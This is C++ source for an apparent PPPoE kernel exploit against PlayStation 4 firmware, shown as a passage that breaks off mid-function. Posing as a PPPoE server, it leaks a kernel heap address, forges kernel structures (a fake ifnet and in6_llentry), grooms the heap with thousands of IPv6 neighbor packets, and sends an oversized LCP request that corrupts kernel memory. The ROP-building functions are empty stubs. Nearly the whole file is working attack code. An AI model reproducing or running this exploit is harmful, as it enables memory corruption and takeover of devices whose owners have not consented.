
#ifdef _WIN32
#define WIN32_LEAN_AND_MEAN

#include <windows.h>

#else
#include <csignal>
#include <unistd.h>
#endif

#include <iostream>
#include <sstream>

#include <IPv6Layer.h>
#include <Packet.h>
#include <PcapFileDevice.h>
#include <PcapLiveDevice.h>
#include <PcapLiveDeviceList.h>
#include <SystemUtils.h>
#include <PPPoELayer.h>
#include <EthLayer.h>
#include <GreLayer.h>
#include <PayloadLayer.h>
#include <EndianPortable.h>
#include <IcmpV6Layer.h>
#include <NdpLayer.h>
#include <Logger.h>

#include "offset.h"
#include "defines.h"

#define SPRAY_NUM 0x1000
#define PIN_NUM 0x1000
#define CORRUPT_NUM 0x1

#define HOLE_START 0x400
#define HOLE_SPACE 0x10

#define LCP_ID 0x41
#define IPCP_ID 0x41

#define SESSION_ID 0xffff

#define STAGE2_PORT 9020

#define PPP_IPCP_Option_IP 0x03

const static std::string SOURCE_MAC = "41:41:41:41:41:41";
const static std::string SOURCE_IPV4 = "41.41.41.41";
const static std::string SOURCE_IPV6 = "fe80::4141:4141:4141:4141";

const static std::string TARGET_IPV4 = "42.42.42.42";

const static std::string BPF_FILTER = "(ip6) || (pppoed) || (pppoes && !ip)";

struct Cookie {
    pcpp::Packet packet;
};

uint16_t force_htole16(uint16_t host_16bits) {
    return ((host_16bits >> 8) & 0xff) | ((host_16bits << 8) & 0xff00);
}

uint16_t p16be(uint64_t val) {
    return htobe16(static_cast<uint16_t>(val & 0xffff));
}

#ifdef DEBUG

void hexdump(const pcpp::Packet &packet) {
    auto *rawData = packet.getRawPacket()->getRawData();
    std::stringstream ss;
    ss << std::hex;
    for (int i = 0; i < packet.getRawPacket()->getRawDataLen(); ++i) {
        if (i % 16 == 0) {
            if (i != 0) ss << "\n";
            ss << std::setw(4) << std::setfill('0') << i << " ";
        }
        ss << std::setw(2) << std::setfill('0') << (int) rawData[i] << " ";
    }
    std::cout << ss.str() << std::endl;
}

#define hexdump_verbose(p) (void) p;

#else
#define hexdump(p) (void) p;
#define hexdump_verbose(p) (void) p;
#endif

//#define DEBUG_STAGE

#ifdef DEBUG_STAGE
#undef SPRAY_NUM
#undef PIN_NUM
#undef CORRUPT_NUM
#define SPRAY_NUM 0x1
#define PIN_NUM 0x1
#define CORRUPT_NUM 0x1

#undef hexdump_verbose
#define hexdump_verbose(packet) hexdump(packet)
#endif

// todo: Support big endian system
#define V64(list, index, data) (*(uint64_t *) &(list)[index]) = data
#define V32(list, index, data) (*(uint32_t *) &(list)[index]) = data
#define V16(list, index, data) (*(uint16_t *) &(list)[index]) = data
#define V8(list, index, data) (*(uint8_t *) &(list)[index]) = data

static pcpp::PayloadLayer buildPPPLayer(pcpp::PPPoELayer &last, uint8_t code, uint8_t id,
                                        const uint8_t *data, size_t data_len) {
    uint8_t ppp_data[4 + data_len];
    ppp_data[0] = code;
    ppp_data[1] = id;
    (*(uint16_t *) &ppp_data[2]) = p16be(4 + data_len);
    if (data_len > 0) memcpy(&ppp_data[4], data, data_len);
    pcpp::PayloadLayer pppLayer(ppp_data, sizeof(ppp_data), false);
    last.getPPPoEHeader()->payloadLength = p16be(force_htole16(last.getPPPoEHeader()->payloadLength) +
                                                 sizeof(ppp_data) + sizeof(uint16_t));
    return pppLayer;
}

// Fake PPP layer, with custom payload len in header filed
static pcpp::PayloadLayer buildPPPLayer(pcpp::PPPoELayer &last, uint8_t code, uint8_t id, size_t data_len) {
    uint8_t ppp_data[4];
    ppp_data[0] = code;
    ppp_data[1] = id;
    (*(uint16_t *) &ppp_data[2]) = p16be(4 + data_len);
    pcpp::PayloadLayer pppLayer(ppp_data, sizeof(ppp_data), false);
    last.getPPPoEHeader()->payloadLength = p16be(force_htole16(last.getPPPoEHeader()->payloadLength) +
                                                 sizeof(ppp_data) + sizeof(uint16_t));
    return pppLayer;
}

static pcpp::PayloadLayer buildPPPLCPOptionLayer(pcpp::PPPoELayer &last, const uint8_t *data, size_t data_len) {
    uint8_t option_data[2 + data_len];
    option_data[0] = 0; // type
    option_data[1] = data_len + 2; // len
    if (data_len > 0) memcpy(&option_data[2], data, data_len);
    pcpp::PayloadLayer pppLayer(option_data, sizeof(option_data), false);
    last.getPPPoEHeader()->payloadLength = p16be(force_htole16(last.getPPPoEHeader()->payloadLength) +
                                                 sizeof(option_data));
    return pppLayer;
}

static pcpp::PPPoESessionLayer *getPPPoESessionLayer(const pcpp::Packet &packet, uint16_t pppType) {
    if (!packet.isPacketOfType(pcpp::PPPoESession)) return nullptr;
    auto *pppLayer = packet.getLayerOfType<pcpp::PPPoESessionLayer>();
    if (pppLayer && pppLayer->getPPPNextProtocol() == pppType) return pppLayer;
    return nullptr;
}

static pcpp::PPPoEDiscoveryLayer *getPPPoEDiscoveryLayer(const pcpp::Packet &packet, uint8_t type) {
    if (!packet.isPacketOfType(pcpp::PPPoEDiscovery)) return nullptr;
    auto *layer = packet.getLayerOfType<pcpp::PPPoEDiscoveryLayer>();
    if (layer && layer->getPPPoEHeader()->code == type) return layer;
    return nullptr;
}

class MyPPPoETagBuilder : public pcpp::PPPoEDiscoveryLayer::PPPoETagBuilder {
public:
    explicit MyPPPoETagBuilder(pcpp::PPPoEDiscoveryLayer::PPPoETagTypes tagType, const uint8_t *recValue,
                               size_t recValueLen) :
            pcpp::PPPoEDiscoveryLayer::PPPoETagBuilder(tagType) {
        this->init(static_cast<uint16_t>(tagType), recValue, recValueLen);
    }
};

class LcpEchoHandler {
public:
    explicit LcpEchoHandler(const std::string &iface) {
        dev = pcpp::PcapLiveDeviceList::getInstance().getPcapLiveDeviceByName(iface);
        if (dev == nullptr) {
            std::cerr << "[-] LcpEchoHandler Cannot find interface with name of '" << iface << "'" << std::endl;
            exit(1);
        }

        pcpp::PcapLiveDevice::DeviceConfiguration config;
        config.direction = pcpp::PcapLiveDevice::PCPP_IN;
        if (!dev->open(config)) {
            std::cerr << "[-] LcpEchoHandler Cannot open device" << std::endl;
            exit(1);
        }

        if (!dev->setFilter("pppoes && !ip")) {
            std::cerr << "[-] LcpEchoHandler cannot set bfp filter" << std::endl;
        }
    }

    void start() {
        running = true;
        dev->startCaptureBlockingMode(
                [](pcpp::RawPacket *packet, pcpp::PcapLiveDevice *device, void *cookie) -> bool {
                    auto *self = (LcpEchoHandler *) cookie;
                    pcpp::Packet parsedPacket(packet, pcpp::PPPoESession);
                    auto *pppLayer = getPPPoESessionLayer(parsedPacket, PCPP_PPP_LCP);
                    if (!pppLayer) return !self->running;
                    if (pppLayer->getLayerPayload()[0] != ECHO_REQ) return !self->running;
                    auto *etherLayer = parsedPacket.getLayerOfType<pcpp::EthLayer>();
                    if (!etherLayer) return !self->running;

                    pcpp::MacAddress srcMac = etherLayer->getDestMac();
                    pcpp::MacAddress dstMac = etherLayer->getSourceMac();
                    pcpp::EthLayer ether(srcMac, dstMac, PCPP_ETHERTYPE_PPPOES);
                    pcpp::PPPoESessionLayer pppoeLayer(1, 1, pppLayer->getPPPoEHeader()->sessionId, PCPP_PPP_LCP);
                    pcpp::PayloadLayer lcpEchoReply = buildPPPLayer(pppoeLayer, ECHO_REPLY,
                                                                    pppLayer->getLayerPayload()[1],
                                                                    nullptr, 0);

                    pcpp::Packet echoReply;
                    echoReply.addLayer(&ether);
                    echoReply.addLayer(&pppoeLayer);
                    echoReply.addLayer(&lcpEchoReply);
                    self->dev->sendPacket(&echoReply);
                    return !self->running;
                }, this, 0);
    }

    void stop() {
        running = false;
    }

    ~LcpEchoHandler() {
        this->stop();
        this->dev->close();
    }

private:
    pcpp::PcapLiveDevice *dev;
    bool running{};
};

class Exploit {
public:
    Exploit(OffsetsFirmware offs, const std::string &iface) : offs(offs) {
        dev = pcpp::PcapLiveDeviceList::getInstance().getPcapLiveDeviceByName(iface);
        if (dev == nullptr) {
            std::cerr << "[-] Cannot find interface with name of '" << iface << "'" << std::endl;
            exit(1);
        }

        // open the device before start capturing/sending packets
        pcpp::PcapLiveDevice::DeviceConfiguration config;
        config.direction = pcpp::PcapLiveDevice::PCPP_IN;
        if (!dev->open(config)) {
            std::cerr << "[-] Cannot open device" << std::endl;
            exit(1);
        }

        if (!dev->setFilter(BPF_FILTER)) {
            std::cerr << "[-] Cannot set bfp filter" << std::endl;
        }

        std::cout
                << "[+] Interface info:" << std::endl
                << "    Interface name:  " << dev->getName() << std::endl
                << "    MAC address:     " << dev->getMacAddress() << std::endl
                << "    Default gateway: " << dev->getDefaultGateway() << std::endl
                << "    Interface MTU:   " << dev->getMtu() << std::endl;
    }

    ~Exploit() {
        this->dev->close();
    }

    void lcp_negotiation() {
        std::cout << "[*] Sending LCP configure request..." << std::endl;
        {

            pcpp::EthLayer ether(this->source_mac, this->target_mac, PCPP_ETHERTYPE_PPPOES);
            pcpp::PPPoESessionLayer pppoeLayer(1, 1, SESSION_ID, PCPP_PPP_LCP);
            pcpp::PayloadLayer pppLayer = buildPPPLayer(pppoeLayer, CONF_REQ, LCP_ID, nullptr, 0);

            pcpp::Packet lcpPacket;
            lcpPacket.addLayer(&ether);
            lcpPacket.addLayer(&pppoeLayer);
            lcpPacket.addLayer(&pppLayer);
            hexdump(lcpPacket);
            this->dev->sendPacket(&lcpPacket);
        }

        std::cout << "[*] Waiting for LCP configure ACK..." << std::endl;
        {
            dev->startCaptureBlockingMode(
                    [](pcpp::RawPacket *packet, pcpp::PcapLiveDevice *device, void *cookie) -> bool {
                        pcpp::Packet parsedPacket(packet);
                        auto *layer = getPPPoESessionLayer(parsedPacket, PCPP_PPP_LCP);
                        if (layer) return layer->getLayerPayload()[0] == CONF_ACK;
                        return false;
                    }, nullptr, 0);
        }

        std::cout << "[*] Waiting for LCP configure request..." << std::endl;
        uint8_t lcp_id = 0;
        {
            dev->startCaptureBlockingMode(
                    [](pcpp::RawPacket *packet, pcpp::PcapLiveDevice *device, void *cookie) -> bool {
                        pcpp::Packet parsedPacket(packet);
                        auto *layer = getPPPoESessionLayer(parsedPacket, PCPP_PPP_LCP);
                        if (layer) {
                            *((uint8_t *) cookie) = layer->getLayerPayload()[1];
                            return layer->getLayerPayload()[0] == CONF_REQ;
                        }
                        return false;
                    }, &lcp_id, 0);
        }

        std::cout << "[*] Sending LCP configure ACK..." << std::endl;
        {
            pcpp::EthLayer ether(this->source_mac, this->target_mac, PCPP_ETHERTYPE_PPPOES);
            pcpp::PPPoESessionLayer pppoeLayer(1, 1, SESSION_ID, PCPP_PPP_LCP);
            pcpp::PayloadLayer pppLayer = buildPPPLayer(pppoeLayer, CONF_ACK, lcp_id, nullptr, 0);

            pcpp::Packet lcpPacket;
            lcpPacket.addLayer(&ether);
            lcpPacket.addLayer(&pppoeLayer);
            lcpPacket.addLayer(&pppLayer);
            hexdump(lcpPacket);
            this->dev->sendPacket(&lcpPacket);
        }
    }

    void ipcp_negotiation() {
        std::cout << "[*] Sending IPCP configure request..." << std::endl;
        {
            pcpp::EthLayer ether(this->source_mac, this->target_mac, PCPP_ETHERTYPE_PPPOES);
            pcpp::PPPoESessionLayer pppoeLayer(1, 1, SESSION_ID, PCPP_PPP_IPCP);
            std::vector<uint8_t> data(6);
            data[0] = PPP_IPCP_Option_IP;
            data[1] = data.size();
            *(uint32_t *) (&data[2]) = pcpp::IPv4Address(SOURCE_IPV4).toInt();
            pcpp::PayloadLayer pppLayer = buildPPPLayer(pppoeLayer, CONF_REQ, IPCP_ID, data.data(), data.size());

            pcpp::Packet ipcpPacket;
            ipcpPacket.addLayer(&ether);
            ipcpPacket.addLayer(&pppoeLayer);
            ipcpPacket.addLayer(&pppLayer);
            hexdump(ipcpPacket);
            this->dev->sendPacket(&ipcpPacket);
        }

        std::cout << "[*] Waiting for IPCP configure ACK..." << std::endl;
        {
            dev->startCaptureBlockingMode(
                    [](pcpp::RawPacket *packet, pcpp::PcapLiveDevice *device, void *cookie) -> bool {
                        pcpp::Packet parsedPacket(packet);
                        auto *layer = getPPPoESessionLayer(parsedPacket, PCPP_PPP_IPCP);
                        if (layer) return layer->getLayerPayload()[0] == CONF_ACK;
                        return false;
                    }, nullptr, 0);
        }

        std::cout << "[*] Waiting for IPCP configure request..." << std::endl;
        uint8_t ipcp_id = 0;
        {
            dev->startCaptureBlockingMode(
                    [](pcpp::RawPacket *packet, pcpp::PcapLiveDevice *device, void *cookie) -> bool {
                        pcpp::Packet parsedPacket(packet);
                        auto *lcp_id = (uint8_t *) cookie;
                        auto *layer = getPPPoESessionLayer(parsedPacket, PCPP_PPP_IPCP);
                        if (layer) {
                            *lcp_id = layer->getLayerPayload()[1];
                            return layer->getLayerPayload()[0] == CONF_REQ;
                        }
                        return false;
                    }, &ipcp_id, 0);
        }

        std::cout << "[*] Sending IPCP configure NAK..." << std::endl;
        {
            pcpp::Packet ipcpPacket;
            pcpp::EthLayer ether(this->source_mac, this->target_mac, PCPP_ETHERTYPE_PPPOES);
            ipcpPacket.addLayer(&ether);

            pcpp::PPPoESessionLayer pppoeLayer(1, 1, SESSION_ID, PCPP_PPP_IPCP);
            ipcpPacket.addLayer(&pppoeLayer);

            std::vector<uint8_t> data(6);
            data[0] = PPP_IPCP_Option_IP;
            data[1] = data.size();
            *(uint32_t *) (&data[2]) = pcpp::IPv4Address(TARGET_IPV4).toInt();
            pcpp::PayloadLayer pppLayer = buildPPPLayer(pppoeLayer, CONF_NAK, ipcp_id, data.data(), data.size());
            ipcpPacket.addLayer(&pppLayer);

            hexdump(ipcpPacket);
            this->dev->sendPacket(&ipcpPacket);
        }

        std::cout << "[*] Waiting for IPCP configure request..." << std::endl;
        Cookie pkt;
        {
            dev->startCaptureBlockingMode(
                    [](pcpp::RawPacket *packet, pcpp::PcapLiveDevice *device, void *cookie) -> bool {
                        pcpp::Packet parsedPacket(packet, pcpp::PPPoESession);
                        auto *layer = getPPPoESessionLayer(parsedPacket, PCPP_PPP_IPCP);
                        if (layer && layer->getLayerPayload()[0] == CONF_REQ) {
                            ((Cookie *) cookie)->packet = parsedPacket;
                            return true;
                        }
                        return false;
                    }, &pkt, 0);
        }

        std::cout << "[*] Sending IPCP configure ACK..." << std::endl;
        {
            pcpp::Packet ipcpPacket;
            pcpp::EthLayer ether(this->source_mac, this->target_mac, PCPP_ETHERTYPE_PPPOES);
            ipcpPacket.addLayer(&ether);

            pcpp::PPPoESessionLayer pppoeLayer(1, 1, SESSION_ID, PCPP_PPP_IPCP);
            ipcpPacket.addLayer(&pppoeLayer);

            auto *layer = getPPPoESessionLayer(pkt.packet, PCPP_PPP_IPCP);
            if (!layer) {
                std::cerr << "[-] No IPCP layer found in packet" << std::endl;
                exit(1);
            }
            uint8_t id = layer->getLayerPayload()[1];
            uint8_t *options = layer->getLayerPayload() + 4;
            uint8_t optionLen = layer->getLayerPayload()[5];

            pcpp::PayloadLayer pppLayer = buildPPPLayer(pppoeLayer, CONF_ACK, id, options, optionLen);
            ipcpPacket.addLayer(&pppLayer);

            hexdump(ipcpPacket);
            this->dev->sendPacket(&ipcpPacket);
        }

    }

    void ppp_negotation(const std::function<std::vector<uint8_t>(Exploit *)> &cb = nullptr,
                        bool ignore_initial_reqs = false) {
        /**
         * Ignore initial requests in order to increase the chances of the exploit to work
         * Tested from 6 to 8 requests, on version 10.50 - all give best results then not ignoring
         */
        static bool ignore{};
        static int num_reqs_to_ignore{}, num_ignored_reqs{};
        ignore = ignore_initial_reqs;
        num_reqs_to_ignore = 6;
        num_ignored_reqs = 0;

        std::cout << "[*] Waiting for PADI..." << std::endl;
        Cookie pkt;
        dev->startCaptureBlockingMode([](pcpp::RawPacket *packet, pcpp::PcapLiveDevice *device, void *cookie) -> bool {
            if (ignore && (num_ignored_reqs < num_reqs_to_ignore)) {
                std::cout << "[*] Ignoring initial PS4 PPoE request #" << num_ignored_reqs + 1 << std::endl;
                num_ignored_reqs += 1;
                return false;
            }
            pcpp::Packet parsedPacket(packet, pcpp::PPPoEDiscovery);
            auto *layer = getPPPoEDiscoveryLayer(parsedPacket, pcpp::PPPoELayer::PPPOE_CODE_PADI);
            if (!layer) return false;
            ((Cookie *) cookie)->packet = parsedPacket;
            return true;
        }, &pkt, 0);

        auto *pppoeDiscoveryLayer = pkt.packet.getLayerOfType<pcpp::PPPoEDiscoveryLayer>();
        if (!pppoeDiscoveryLayer) {
            std::cerr << "[-] No PPPoE discovery layer found in PADI packet" << std::endl;
            exit(1);
        }
        uint8_t *host_uniq = nullptr;
        pcpp::PPPoEDiscoveryLayer::PPPoETag tag = pppoeDiscoveryLayer->getFirstTag();
        while (tag.isNotNull()) {
            if (tag.getType() == pcpp::PPPoEDiscoveryLayer::PPPOE_TAG_HOST_UNIQ) {
                host_uniq = tag.getValue();
                break;
            }
            tag = pppoeDiscoveryLayer->getNextTag(tag);
        }
        if (!host_uniq) {
            std::cerr << "[-] No host-uniq tag found in PADI packet" << std::endl;
            exit(1);
        }
        if (tag.getDataSize() != sizeof(uint64_t)) {
            std::cerr << "[-] Invalid host-uniq tag size: " << tag.getDataSize() << std::endl;
            exit(1);
        }

        memcpy(&pppoe_softc, host_uniq, sizeof(pppoe_softc));
        pppoe_softc = be64toh(pppoe_softc);
        std::cout << "[+] pppoe_softc: 0x" << std::hex << pppoe_softc << std::endl;

        auto *ethLayer = pkt.packet.getLayerOfType<pcpp::EthLayer>();
        if (ethLayer) {
            target_mac = ethLayer->getSourceMac();
            std::cout << "[+] Target MAC: " << target_mac << std::endl;
        }

        source_mac = pcpp::MacAddress(SOURCE_MAC);

        std::vector<uint8_t> ac_cookie;
        if (cb)
            ac_cookie = cb(this);
        std::cout << "[+] AC cookie length: " << std::hex << ac_cookie.size() << std::endl;

        std::cout << "[*] Sending PADO..." << std::endl;
        {
            pcpp::Packet padoPacket;
            pcpp::EthLayer ether(this->source_mac, this->target_mac, PCPP_ETHERTYPE_PPPOED);
            padoPacket.addLayer(&ether);
            pcpp::PPPoEDiscoveryLayer pppoeLayer(1, 1, pcpp::PPPoELayer::PPPOE_CODE_PADO, 0);
            pppoeLayer.addTag(MyPPPoETagBuilder{pcpp::PPPoEDiscoveryLayer::PPPOE_TAG_AC_COOKIE,
                                                (uint8_t *) ac_cookie.data(),
                                                ac_cookie.size()});
            pppoeLayer.addTag(MyPPPoETagBuilder{pcpp::PPPoEDiscoveryLayer::PPPOE_TAG_HOST_UNIQ,
                                                host_uniq,
                                                sizeof(uint64_t)});
            padoPacket.addLayer(&pppoeLayer);
            hexdump(padoPacket);
            this->dev->sendPacket(&padoPacket);
        }

        std::cout << "[*] Waiting for PADR..." << std::endl;
        {
            dev->startCaptureBlockingMode(
                    [](pcpp::RawPacket *packet, pcpp::PcapLiveDevice *device, void *cookie) -> bool {
                        pcpp::Packet parsedPacket(packet);
                        auto *layer = getPPPoEDiscoveryLayer(parsedPacket, pcpp::PPPoELayer::PPPOE_CODE_PADR);
                        if (layer) return true;
                        return false;
                    }, nullptr, 0);
        }

        std::cout << "[*] Sending PADS..." << std::endl;
        {
            pcpp::EthLayer ether(this->source_mac, this->target_mac, PCPP_ETHERTYPE_PPPOED);
            pcpp::PPPoEDiscoveryLayer pppoeLayer(1, 1, pcpp::PPPoELayer::PPPOE_CODE_PADS, SESSION_ID);
            pppoeLayer.addTag({pcpp::PPPoEDiscoveryLayer::PPPOE_TAG_HOST_UNIQ, host_uniq, sizeof(uint64_t)});

            pcpp::Packet padsPacket;
            padsPacket.addLayer(&ether);
            padsPacket.addLayer(&pppoeLayer);
            hexdump(padsPacket);
            this->dev->sendPacket(&padsPacket);
        }
    }

    static std::vector<uint8_t> build_fake_ifnet(Exploit *self) {
        // Leak address
        // Upper bytes are encoded with SESSION_ID
        union Converter {
            uint64_t u64;
            uint8_t u8[8];
        };
        Converter planted{};
        planted.u64 = (self->pppoe_softc + 0x07) & 0xffffffffffff;
        self->source_mac = pcpp::MacAddress(planted.u8);
        std::cout << "[+] Source MAC: " << self->source_mac << std::endl;

        // Fake ifnet
        std::vector<uint8_t> fake_ifnet(0x4e0, 'A');

        V64(fake_ifnet, 0x48, ZERO);     // if_addrhead
        V16(fake_ifnet, 0x70, 0x0001);   // if_index
        V8(fake_ifnet, 0xa0, IFT_ETHER); // ifi_type
        V8(fake_ifnet, 0xa1, 0);         // ifi_physical
        V8(fake_ifnet, 0xa2, 0x8 + 0x1); // ifi_addrlen
        V64(fake_ifnet, 0x1b8, self->pppoe_softc + PPPOE_SOFTC_SC_DEST); // if_addr
        V64(fake_ifnet, 0x428, self->pppoe_softc + 0x10 - 0x8);          // nd_ifinfo

        // if_afdata_lock
        V64(fake_ifnet, 0x480, ZERO);          // lo_name
        V32(fake_ifnet, 0x488, RW_INIT_FLAGS); // lo_flags
        V32(fake_ifnet, 0x48c, 0);             // lo_data
        V64(fake_ifnet, 0x490, ZERO);          // lo_witness
        V64(fake_ifnet, 0x498, RW_UNLOCKED);   // rw_lock

        // if_addr_mtx
        V64(fake_ifnet, 0x4c0, ZERO);           // lo_name
        V32(fake_ifnet, 0x4c8, MTX_INIT_FLAGS); // lo_flags
        V32(fake_ifnet, 0x4cc, 0);              // lo_data
        V64(fake_ifnet, 0x4d0, ZERO);           // lo_witness
        V64(fake_ifnet, 0x4d8, MTX_UNOWNED);    // mtx_lock

        return fake_ifnet;
    }

    static std::vector<uint8_t> build_overflow_lle(Exploit *self) {
        // Fake in6_llentry
        std::vector<uint8_t> overflow_lle(0x78, 0);

        // lle_next
        V64(overflow_lle, 0, self->pppoe_softc + PPPOE_SOFTC_SC_AC_COOKIE); // le_next
        V64(overflow_lle, 0x8, ZERO); // le_prev

        // lle_lock
        V64(overflow_lle, 0x10, ZERO); // lo_name
        V32(overflow_lle, 0x18, RW_INIT_FLAGS | LO_DUPOK); // lo_flags
        V32(overflow_lle, 0x1c, 0);           // lo_data
        V64(overflow_lle, 0x20, ZERO);        // lo_witness
        V64(overflow_lle, 0x28, RW_UNLOCKED); // rw_lock

        V64(overflow_lle, 0x30, self->pppoe_softc + PPPOE_SOFTC_SC_AC_COOKIE - LLTABLE_LLTIFP); // lle_tbl
        V64(overflow_lle, 0x38, ZERO); // lle_head
        V64(overflow_lle, 0x40, ZERO); // lle_free
        V64(overflow_lle, 0x48, ZERO); // la_hold
        V32(overflow_lle, 0x50, 0);    // la_numheld
        V32(overflow_lle, 0x54, 0);    // pad
        V64(overflow_lle, 0x58, 0);    // la_expire

        V16(overflow_lle, 0x60, LLE_EXCLUSIVE);      // la_flags
        V16(overflow_lle, 0x62, 0);                  // la_asked
        V16(overflow_lle, 0x64, 0);                  // la_preempt
        V16(overflow_lle, 0x66, 0);                  // ln_byhint
        V16(overflow_lle, 0x68, ND6_LLINFO_NOSTATE); // ln_state
        V16(overflow_lle, 0x6a, 0);                  // ln_router
        V32(overflow_lle, 0x6c, 0);                  // pad
        V64(overflow_lle, 0x70, 0x7fffffffffffffff); // ln_ntick

        return overflow_lle;
    }

    static std::vector<uint8_t> build_fake_lle(Exploit *self) {
        (void)self;
        return {};
    }

    static std::vector<uint8_t> build_first_rop(Exploit *self) {
        (void)self;
        return {};
    }

    static std::vector<uint8_t> build_second_rop(Exploit *self) {
        (void)self;
        return {};
    }

    void stage0() {
        this->ppp_negotation(Exploit::build_fake_ifnet, true);
        this->lcp_negotiation();
        this->ipcp_negotiation();

        std::cout << "[*] Waiting for interface to be ready..." << std::endl;
        dev->startCaptureBlockingMode(
                [](pcpp::RawPacket *packet, pcpp::PcapLiveDevice *device, void *cookie) -> bool {
                    auto *exp = (Exploit *) cookie;
                    pcpp::Packet parsedPacket(packet, pcpp::ICMPv6);
                    if (!parsedPacket.isPacketOfType(pcpp::ICMPv6)) return false;
                    auto *layer = parsedPacket.getLayerOfType<pcpp::IcmpV6Layer>();
                    if (layer && layer->getMessageType() == pcpp::ICMPv6MessageType::ICMPv6_ROUTER_SOLICITATION) {
                        auto *ipv6Layer = parsedPacket.getLayerOfType<pcpp::IPv6Layer>();
                        if (!ipv6Layer) return false;
                        exp->target_ipv6 = ipv6Layer->getSrcIPv6Address();
                        std::cout << "[+] Target IPv6: " << exp->target_ipv6 << std::endl;
                        return true;
                    }
                    return false;
                }, this, 0);

        for (size_t i = 0; i < SPRAY_NUM; i++) {
            if (i % 0x10 == 0) {
                std::cout << "\r[*] Heap grooming..." << std::dec << 100 * i / SPRAY_NUM << "%" << std::flush;
            }

            std::stringstream sourceIpv6;
            sourceIpv6 << "fe80::" << std::setfill('0') << std::setw(4) << std::hex << i << ":4141:4141:4141";
            {
                pcpp::EthLayer ethLayer(this->source_mac, this->target_mac);
                pcpp::IPv6Layer ipv6Layer(pcpp::IPv6Address(sourceIpv6.str()), this->target_ipv6);
                ipv6Layer.getIPv6Header()->hopLimit = 0x40;
                pcpp::ICMPv6EchoLayer echoRequestLayer(pcpp::ICMPv6EchoLayer::REQUEST, 0, 0, nullptr, 0);

                pcpp::Packet echoRequestPacket;
                echoRequestPacket.addLayer(&ethLayer);
                echoRequestPacket.addLayer(&ipv6Layer);
                echoRequestPacket.addLayer(&echoRequestLayer);
                echoRequestPacket.computeCalculateFields();
                hexdump_verbose(echoRequestPacket);
                dev->sendPacket(&echoRequestPacket);
            }

            dev->startCaptureBlockingMode(
                    [](pcpp::RawPacket *packet, pcpp::PcapLiveDevice *device, void *cookie) -> bool {
                        auto start = std::chrono::high_resolution_clock::now();
                        pcpp::Packet parsedPacket(packet, pcpp::ICMPv6);
                        if (!parsedPacket.isPacketOfType(pcpp::ICMPv6)) return false;
                        auto *layer = parsedPacket.getLayerOfType<pcpp::IcmpV6Layer>();
                        if (!layer) return false;
                        return layer->getMessageType() == pcpp::ICMPv6MessageType::ICMPv6_NEIGHBOR_SOLICITATION;
                    }, nullptr, 0);

            if (i >= HOLE_START && i % HOLE_SPACE == 0) continue;

            {
                pcpp::EthLayer ethLayer(this->source_mac, this->target_mac);
                pcpp::IPv6Layer ipv6Layer(pcpp::IPv6Address(sourceIpv6.str()), this->target_ipv6);
                ipv6Layer.getIPv6Header()->hopLimit = 0xFF;
                pcpp::NDPNeighborAdvertisementLayer ndpLayer(0,
                                                             pcpp::IPv6Address(sourceIpv6.str()),
                                                             this->source_mac, true, true, true);

                pcpp::Packet ndPacket;
                ndPacket.addLayer(&ethLayer);
                ndPacket.addLayer(&ipv6Layer);
                ndPacket.addLayer(&ndpLayer);
                ndPacket.computeCalculateFields();
                hexdump_verbose(ndPacket);
                dev->sendPacket(&ndPacket);
            }
        }
        std::cout << "\r[+] Heap grooming...done" << std::endl;
    }

    void stage1() {
        /**
         * Send invalid packet to trigger a printf in the kernel. For some
         * reason, this causes scheduling on CPU 0 at some point, which makes
         * the next allocation use the same per-CPU cache.
         */
        {
            pcpp::EthLayer ethLayer(this->source_mac, this->target_mac, ETHERTYPE_PPPOE);
            pcpp::Packet packet;
            packet.addLayer(&ethLayer);
            hexdump(packet);
            for (int i = 0; i < PIN_NUM; ++i) {
                if (i % 0x20 == 0) {
                    std::cout << std::dec << "\r[*] Pinning to CPU 0..." << std::setfill('0') << std::setw(2)
                              << (100 * i / PIN_NUM) << "%" << std::flush;
                }
                dev->sendPacket(&packet);
                 pcpp::multiPlatformMSleep(1);
            }
        }

        std::cout << "\r[+] Pinning to CPU 0...done" << std::endl;

        // LCP fails sometimes without the wait
        pcpp::multiPlatformMSleep(1000);

        // Corrupt in6_llentry object
        {
            std::vector<uint8_t> overflow_lle = Exploit::build_overflow_lle(this);
            std::cout << "[*] Sending malicious LCP configure request..." << std::endl;
            pcpp::EthLayer ethLayer(this->source_mac, this->target_mac, ETHERTYPE_PPPOE);
            pcpp::PPPoESessionLayer pppoeLayer(1, 1, SESSION_ID, PCPP_PPP_LCP);
            pcpp::PayloadLayer pppLayer = buildPPPLayer(pppoeLayer, CONF_REQ, LCP_ID, TARGET_SIZE);
            std::vector<uint8_t> ppp_data(TARGET_SIZE - 4, 'A');
            pcpp::PayloadLayer pppDataLayer = buildPPPLCPOptionLayer(pppoeLayer, ppp_data.data(), ppp_data.size());
            pcpp::PayloadLayer overflowLayer = buildPPPLCPOptionLayer(pppoeLayer, overflow_lle.data(),
                                                                      overflow_lle.size());

            pcpp::Packet packet;
            packet.addLayer(&ethLayer);
            packet.addLayer(&pppoeLayer);
            packet.addLayer(&pppLayer);
            packet.addLayer(&pppDataLayer);
            packet.addLayer(&overflowLayer);
            hexdump(packet);
            for (int i = 0; i < CORRUPT_NUM; ++i) {
                dev->sendPacket(&packet);
            }
        }

        std::cout << "[*] Waiting for LCP configure reject..." << std::endl;
        dev->startCaptureBlockingMode(
                [](pcpp::RawPacket *packet, pcpp::PcapLiveDevice *device, void *cookie) -> bool {
                    pcpp::Packet parsedPacket(packet);
                    auto *layer = getPPPoESessionLayer(parsedPacket, PCPP_PPP_LCP);
                    if (layer) return layer->getLayerPayload()[0] == CONF_REJ;
                    return false;
                }, nullptr, 0);

        // Re-negotiate after rejection
        this->lcp_negotiation();
        this->ipcp_negotiation();

        bool corrupted = false;
        std::stringstream sourceIpv6;
        for (int i = SPRAY_NUM - 1; i >= 0; --i) {
            if (i % 0x100 == 0) {
                std::cout << "\r[*] Scanning for corrupted object... 0x"
                          << std::setfill('0') << std::setw(3)
                          << std::hex << i << std::flush;
            }

            if (i >= HOLE_START && i % HOLE_SPACE == 0) {
                continue;
            }

            sourceIpv6.clear();
            sourceIpv6.str("");
            sourceIpv6 << "fe80::" << std::setfill('0') << std::setw(4) << std::hex << i << ":4141:4141:4141";

            {
                pcpp::EthLayer ethLayer(this->source_mac, this->target_mac);
                pcpp::IPv6Layer ipv6Layer(pcpp::IPv6Address(sourceIpv6.str()), this->target_ipv6);
                ipv6Layer.getIPv6Header()->hopLimit = 0x40;
                pcpp::ICMPv6EchoLayer echoRequestLayer(pcpp::ICMPv6EchoLayer::REQUEST, 0, 0, nullptr, 0);

                pcpp::Packet echoRequestPacket;
